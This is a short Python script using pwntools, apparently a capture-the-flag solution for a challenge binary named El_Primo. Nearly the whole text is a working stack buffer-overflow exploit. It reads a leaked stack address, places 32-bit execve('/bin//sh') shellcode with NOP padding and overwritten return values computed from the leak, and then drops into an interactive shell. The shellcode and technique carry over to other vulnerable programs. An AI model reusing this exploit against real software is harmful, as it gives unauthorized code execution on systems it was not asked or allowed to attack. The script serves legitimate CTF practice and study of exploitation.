from pwn import *

r = process('./El_Primo')
raw_input('debug')

shellcode = '\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x31\xD2\xB0\x0B\xCD\x80'
offset = 0x20

r.recvuntil('hint: ')
res = r.recv(10)
leak = int(res, 16)

log.info('leak %#x' %leak)
payload = shellcode.ljust(offset, '\x90') + p32(leak + 0x30) + 'a'*8 + p32(leak)
r.sendlineafter('\n', payload)

r.interactive()
r.close()

# FLAG